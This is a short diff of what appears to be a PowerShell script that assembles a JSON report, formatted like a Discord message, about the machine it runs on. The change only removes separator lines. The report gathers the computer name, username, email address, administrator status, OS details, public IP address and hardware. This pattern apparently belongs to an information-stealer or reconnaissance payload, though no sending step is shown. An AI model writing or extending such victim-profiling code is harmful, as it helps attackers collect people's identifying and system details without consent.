@@ -1061,24 +1061,20 @@ $script:jsonPayload = @{
             "description" = @"
 ``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
 :man_detective: **User Information** :man_detective:
------------------------------------------------
 - **Current User**          : ``$env:USERNAME``
 - **Email Address**         : ``$email``
 - **Language**              : ``$systemLanguage``
 - **Administrator**         : ``$adminperms``
 
 :minidisc: **OS Information** :minidisc:
------------------------------------------------
 - **Current OS**            : ``$OSString``
 - **Build ID**              : ``$ver``
 - **Architechture**         : ``$OSArch``
 
 :globe_with_meridians: **Network Information** :globe_with_meridians:
------------------------------------------------
 - **Public IP Address**     : ``$computerPubIP``
 
 :desktop: **Hardware Information** :desktop:
------------------------------------------------
 - **Processor**             : ``$processor`` 
 - **Memory**                : ``$RamInfo``
 - **Gpu**                   : ``$gpu``
